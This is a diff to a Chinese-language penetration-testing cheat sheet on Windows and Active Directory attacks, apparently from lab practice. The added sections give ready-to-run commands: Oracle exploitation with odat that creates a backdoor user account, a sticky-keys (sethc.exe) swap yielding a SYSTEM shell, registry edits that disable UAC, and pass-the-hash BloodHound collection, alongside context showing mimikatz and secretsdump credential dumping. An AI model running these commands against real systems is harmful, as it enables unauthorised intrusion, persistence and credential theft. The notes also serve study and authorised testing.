@@ -387,6 +387,11 @@
         <li><a href="#伪造域组获得高权限">伪造域组获得高权限</a></li>
       </ul>
     </li>
+    <li><a href="#oracle相关">Oracle相关</a>
+      <ul>
+        <li><a href="#odat利用">odat利用</a></li>
+      </ul>
+    </li>
     <li><a href="#域历史漏洞或者中继cve">域历史漏洞或者中继（cve）</a>
       <ul>
         <li><a href="#nopac漏洞">nopac漏洞</a></li>
@@ -418,6 +423,7 @@
     </li>
     <li><a href="#本地特权利用">本地特权利用</a>
       <ul>
+        <li><a href="#serestoreprivilege">SeRestorePrivilege</a></li>
         <li><a href="#sebackupprivilege">SeBackupPrivilege</a></li>
         <li><a href="#seimpersonateprivilege">SeImpersonatePrivilege</a></li>
         <li><a href="#seenabledelegationprivilege">SeEnableDelegationPrivilege</a></li>
@@ -549,6 +555,7 @@
         <li><a href="#通过转存本地解密全部hash">通过转存本地解密全部hash</a></li>
       </ul>
     </li>
+    <li><a href="#关闭全局uac需要重启需要system或者管理员权限">关闭全局uac(需要重启，需要system或者管理员权限)</a></li>
     <li><a href="#绕过lasppl保护转存hash">绕过las(ppl)保护转存hash</a>
       <ul>
         <li><a href="#mimikatz">mimikatz</a></li>
@@ -864,7 +871,10 @@
 </span></span></code></pre></div><p>之后抓取</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>proxychains4 rusthound -i <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span>  -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">@</span>$domain<span style="color:#e6db74">&#34;</span> -k  -o ./ -z --ldaps -f <span style="color:#e6db74">&#34;</span>$dc<span style="color:#e6db74">&#34;</span>
 </span></span></code></pre></div><h4 id="bloodhound-python">bloodhound-python
-</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodhound-python -d $domain -c ALL -u $user -p $pass -ns $ip --zip
+</h4><p>密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodhound-python -d $domain -c ALL -u $user -p $pass -ns $ip --zip
+</span></span></code></pre></div><p>hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodhound-python -d $domain -c ALL -u $user --hashs :$hash -ns $ip --zip
 </span></span></code></pre></div><p>dns服务不正常（透过代理抓取）处理办法</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e"># 先将dc写入hosts</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># 之后利用dnsmasq将本地充当dns服务器进行本地解析</span>
@@ -2357,6 +2367,14 @@ nxc</p>
 </span></span></code></pre></div><p>用这个伪装的服务账户我们会同时在数据库中获得域管组（512），企业管理员组（519）.以及特殊的其他组（1105）</p>
 <p>虽然连接进去就算反弹shell也是服务账户的权限，但是可以以其组权限进行文件读取</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT BulkColumn FROM OPENROWSET <span style="color:#f92672">(</span>BULK <span style="color:#e6db74">&#39;C:\Users\Administrator\Desktop\root.txt&#39;</span>, SINGLE_CLOB<span style="color:#f92672">)</span> AS MyFile;
+</span></span></code></pre></div><h2 id="oracle相关">Oracle相关
+</h2><h3 id="odat利用">odat利用
+</h3><p>查看是否允许sysadm登陆，并筛查当前环境</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>odat all -s $ip  -n $database   -U $user   -P $pass --sysdba
+</span></span></code></pre></div><p>是否允许执行命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>odat externaltable -s $ip  -n $database   -U $user   -P $pass --sysdba --test-module
+</span></span></code></pre></div><p>如果允许，可以执行命令，建议不要过长</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>odat dbmsscheduler -s $ip  -n $database   -U $user   -P $pass --sysdba --exec <span style="color:#e6db74">&#39;net user wackymaker wack1234! /add&#39;</span>
 </span></span></code></pre></div><h2 id="域历史漏洞或者中继cve">域历史漏洞或者中继（cve）
 </h2><h3 id="nopac漏洞">nopac漏洞
 </h3><h4 id="要求">要求
@@ -2501,7 +2519,12 @@ nxc</p>
 </span></span></code></pre></div><h2 id="本地特权利用">本地特权利用
 </h2><p>我只做打靶机或者本地测试完毕的记录，但这篇很厉害，如果我的不全可以去这里找</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8
-</span></span></code></pre></div><h3 id="sebackupprivilege">SeBackupPrivilege
+</span></span></code></pre></div><h3 id="serestoreprivilege">SeRestorePrivilege
+</h3><p>要求需要桌面级操作，可提升至system</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ren sethc.exe sethc.bak
+</span></span><span style="display:flex;"><span>ren cmd.exe sethc.exe
+</span></span></code></pre></div><p>执行完毕以上操作后，退出登陆，锁定用户之后，五下shift，会弹出cmd.exe，并且权限为system</p>
+<h3 id="sebackupprivilege">SeBackupPrivilege
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt#L495
 </span></span></code></pre></div><h4 id="mimikatz抓取本地sam以及system">mimikatz抓取本地sam以及system
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv
@@ -3677,6 +3700,11 @@ sekurlsa::logonPasswords full
 </span></span><span style="display:flex;"><span>ntds.dit	C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\N</span>TDS<span style="color:#ae81ff">\n</span>tds.dit
 </span></span></code></pre></div><p>抓到本地后可以解密</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL
+</span></span></code></pre></div><h2 id="关闭全局uac需要重启需要system或者管理员权限">关闭全局uac(需要重启，需要system或者管理员权限)
+</h2><p>执行后所有管理员默认以高权限运行，uac被移除</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>reg add HKLM<span style="color:#ae81ff">\S</span>OFTWARE<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\C</span>urrentVersion<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\S</span>ystem /v EnableLUA /t REG_DWORD /d <span style="color:#ae81ff">0</span> /f
+</span></span><span style="display:flex;"><span>reg add HKLM<span style="color:#ae81ff">\S</span>OFTWARE<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\C</span>urrentVersion<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\S</span>ystem /v ConsentPromptBehaviorAdmin /t REG_DWORD /d <span style="color:#ae81ff">0</span> /f
+</span></span><span style="display:flex;"><span>reg add HKLM<span style="color:#ae81ff">\S</span>OFTWARE<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\C</span>urrentVersion<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\S</span>ystem /v PromptOnSecureDesktop /t REG_DWORD /d <span style="color:#ae81ff">0</span> /f
 </span></span></code></pre></div><h2 id="绕过lasppl保护转存hash">绕过las(ppl)保护转存hash
 </h2><h3 id="mimikatz">mimikatz
 </h3><p>需要同时上传mimidrv.sys</p>
